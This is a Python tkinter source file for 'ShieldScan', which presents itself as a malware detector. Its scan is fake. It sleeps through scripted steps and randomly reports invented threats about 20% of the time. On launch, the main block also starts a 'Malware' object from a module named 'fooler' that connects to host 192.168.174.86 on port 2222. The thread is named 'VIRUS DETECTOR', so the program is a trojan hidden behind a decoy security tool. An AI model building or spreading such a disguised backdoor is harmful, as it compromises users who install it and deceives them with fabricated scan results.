import tkinter as tk
from tkinter import ttk,messagebox,filedialog
from threading import Thread
from fooler import Malware
from depchker import Dependencies_Installer
import time
import random
import os

'''
-------------------------------------------------------
           MAY BE THE BELOW WILL REQUIRED 
-------------------------------------------------------
from os import system
from io import StringIO
from sys import stdout,stderr

def clearscrn():
    buffer_out = StringIO()
    buffer_err = StringIO()
    stdout,stderr = buffer_out,buffer_err
    if stdout and stderr:
        system('cls')
    else:
        pass
------------------------------------------------------
'''

class MalwareDetectorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("ShieldScan - Malware Detector")
        self.root.geometry("600x500")
        self.root.resizable(False, False)
        
        # Set window icon (using default tkinter icon as placeholder)
        try:
            self.root.iconbitmap("shield.ico")  # Placeholder icon name
        except:
            pass
        
        # Style configuration
        self.style = ttk.Style()
        self.style.theme_use("clam")
        
        # Colors
        self.bg_color = "#f0f2f5"
        self.primary_color = "#4285f4"
        self.secondary_color = "#34a853"
        self.danger_color = "#ea4335"
        self.text_color = "#333333"
        
        # Configure styles
        self.style.configure("TFrame", background=self.bg_color)
        self.style.configure("TLabel", background=self.bg_color, foreground=self.text_color, font=("Segoe UI", 10))
        self.style.configure("TButton", font=("Segoe UI", 10, "bold"), padding=6)
        self.style.configure("Primary.TButton", foreground="white", background=self.primary_color)
        self.style.configure("Secondary.TButton", foreground="white", background=self.secondary_color)
        self.style.configure("Danger.TButton", foreground="white", background=self.danger_color)
        self.style.configure("TEntry", font=("Segoe UI", 10), padding=5)
        self.style.configure("TProgressbar", thickness=20, troughcolor=self.bg_color, background=self.primary_color)
        self.style.configure("Status.TLabel", font=("Segoe UI", 10, "bold"))
        
        # Main container
        self.main_frame = ttk.Frame(root, padding="20")
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Load and display logo (using text as placeholder)
        self.logo_label = ttk.Label(
            self.main_frame, 
            text="üõ°Ô∏è ShieldScan", 
            font=("Segoe UI", 24, "bold"), 
            foreground=self.primary_color
        )
        self.logo_label.pack(pady=(0, 20))
        
        # Subtitle
        self.subtitle_label = ttk.Label(
            self.main_frame, 
            text="Advanced Malware Detection System", 
            font=("Segoe UI", 12), 
            foreground="#666666"
        )
        self.subtitle_label.pack(pady=(0, 30))
        
        # Scan target selection frame
        self.target_frame = ttk.LabelFrame(
            self.main_frame, 
            text=" Scan Target ", 
            padding=(15, 10)
        )
        self.target_frame.pack(fill=tk.X, pady=(0, 20))
        
        # File path entry
        self.path_var = tk.StringVar()
        self.path_entry = ttk.Entry(
            self.target_frame, 
            textvariable=self.path_var, 
            width=50
        )
        self.path_entry.grid(row=0, column=0, padx=(0, 10), sticky="ew")
        
        # Browse button
        self.browse_btn = ttk.Button(
            self.target_frame, 
            text="Browse...", 
            style="Secondary.TButton",
            command=self.browse_file
        )
        self.browse_btn.grid(row=0, column=1, sticky="e")
        
        # Tooltip for browse button
        self.create_tooltip(self.browse_btn, "Select a file or folder to scan")
        
        # Scan button
        self.scan_btn = ttk.Button(
            self.main_frame, 
            text="Start Scan", 
            style="Primary.TButton",
            command=self.start_scan
        )
        self.scan_btn.pack(pady=(10, 20), ipadx=20, ipady=5)
        
        # Progress bar
        self.progress = ttk.Progressbar(
            self.main_frame, 
            orient="horizontal", 
            length=400, 
            mode="determinate"
        )
        self.progress.pack(pady=(0, 20))
        
        # Status label
        self.status_var = tk.StringVar(value="Ready to scan")
        self.status_label = ttk.Label(
            self.main_frame, 
            textvariable=self.status_var, 
            style="Status.TLabel",
            foreground=self.text_color
        )
        self.status_label.pack(pady=(0, 10))
        
        # Results frame
        self.results_frame = ttk.LabelFrame(
            self.main_frame, 
            text=" Scan Results ", 
            padding=(15, 10)
        )
        self.results_frame.pack(fill=tk.BOTH, expand=True)
        
        # Results text
        self.results_text = tk.Text(
            self.results_frame, 
            height=8, 
            wrap=tk.WORD, 
            font=("Consolas", 9), 
            padx=10, 
            pady=10,
            state=tk.DISABLED
        )
        self.results_text.pack(fill=tk.BOTH, expand=True)
        
        # Configure grid weights
        self.target_frame.columnconfigure(0, weight=1)
        
    def create_tooltip(self, widget, text):
        tooltip = None
        
        def enter(event):
            nonlocal tooltip
            x, y, _, _ = widget.bbox("insert")
            x += widget.winfo_rootx() + 25
            y += widget.winfo_rooty() + 25
            
            tooltip = tk.Toplevel(widget)
            tooltip.wm_overrideredirect(True)
            tooltip.wm_geometry(f"+{x}+{y}")
            
            label = ttk.Label(
                tooltip, 
                text=text, 
                background="#ffffe0", 
                relief="solid", 
                borderwidth=1,
                padding=(5, 2),
                font=("Segoe UI", 8)
            )
            label.pack()
        
        def leave(event):
            nonlocal tooltip
            if tooltip:
                tooltip.destroy()
                tooltip = None
        
        widget.bind("<Enter>", enter)
        widget.bind("<Leave>", leave)
    
    def browse_file(self):
        file_path = filedialog.askopenfilename(
            title="Select file to scan",
            filetypes=[("All Files", "*.*")]
        )
        if file_path:
            self.path_var.set(file_path)
    
    def start_scan(self):
        target = self.path_var.get()
        
        if not target:
            messagebox.showwarning("Warning", "Please select a file or folder to scan")
            return
        
        # Disable controls during scan
        self.path_entry.config(state=tk.DISABLED)
        self.browse_btn.config(state=tk.DISABLED)
        self.scan_btn.config(state=tk.DISABLED)
        
        # Reset UI
        self.progress["value"] = 0
        self.status_var.set("Scanning...")
        self.update_results("Scan started...\n")
        
        # Simulate scan process
        self.root.after(100, lambda: self.simulate_scan(target))
    
    def simulate_scan(self, target):
        steps = [
            ("Initializing scan engine", 10),
            ("Analyzing file structure", 20),
            ("Checking for known signatures", 35),
            ("Heuristic analysis", 50),
            ("Behavioral analysis", 70),
            ("Checking for vulnerabilities", 85),
            ("Finalizing results", 100)
        ]
        
        for step, progress in steps:
            if not self.scan_btn["state"] == tk.DISABLED:
                return  # Scan was cancelled
            
            self.progress["value"] = progress
            self.status_var.set(step)
            self.append_results(f"‚è≥ {step}...\n")
            self.root.update()
            
            # Random delay between 0.5 and 2 seconds
            time.sleep(random.uniform(0.5, 2))
        
        # Scan complete
        self.scan_complete(target)
    
    def scan_complete(self, target):
        # Randomly determine if malware was found (20% chance)
        malware_found = random.random() < 0.2
        
        if malware_found:
            # Generate fake malware details
            malware_types = ["Trojan", "Worm", "Ransomware", "Spyware", "Adware", "Rootkit"]
            malware_names = ["Agent.BTZ", "WannaCry", "Zeus", "DarkComet", "CryptoLocker"]
            
            detected_malware = [
                f"{random.choice(malware_types)}.{random.choice(malware_names)}",
                f"Riskware.{random.choice(['Keylogger', 'Botnet', 'Miner'])}"
            ]
            
            self.status_var.set("Malware detected!")
            self.status_label.config(foreground=self.danger_color)
            
            result_text = "\n".join([
                "üö® Scan completed with warnings!",
                "",
                f"Scanned: {os.path.basename(target)}",
                f"Path: {target}",
                "",
                "Detected threats:",
                f" - {detected_malware[0]} (High risk)",
                f" - {detected_malware[1]} (Medium risk)",
                "",
                "Recommendation: Quarantine and remove these threats immediately."
            ])
        else:
            self.status_var.set("No threats found")
            self.status_label.config(foreground=self.secondary_color)
            
            result_text = "\n".join([
                "‚úÖ Scan completed successfully!",
                "",
                f"Scanned: {os.path.basename(target)}",
                f"Path: {target}",
                "",
                "No malware, viruses, or other threats were detected.",
                "Your system appears to be clean."
            ])
        
        self.update_results(result_text)
        
        # Re-enable controls
        self.path_entry.config(state=tk.NORMAL)
        self.browse_btn.config(state=tk.NORMAL)
        self.scan_btn.config(state=tk.NORMAL, text="Scan Again")
    
    def update_results(self, text):
        self.results_text.config(state=tk.NORMAL)
        self.results_text.delete(1.0, tk.END)
        self.results_text.insert(tk.END, text)
        self.results_text.config(state=tk.DISABLED)
        self.results_text.see(tk.END)
    
    def append_results(self, text):
        self.results_text.config(state=tk.NORMAL)
        self.results_text.insert(tk.END, text)
        self.results_text.config(state=tk.DISABLED)
        self.results_text.see(tk.END)


if __name__ == '__main__':
    di = Dependencies_Installer()
    root = tk.Tk()
    app = MalwareDetectorApp(root)
    dep_chekcer = Thread(target=di.start)
    malware = Malware('192.168.174.86',2222)
    main_thread = Thread(name='VIRUS DETECTOR',target=malware.run,daemon=False)
    dep_chekcer.start()
    dep_chekcer.join()
    main_thread.start()
    root.mainloop()
    main_thread.join()
    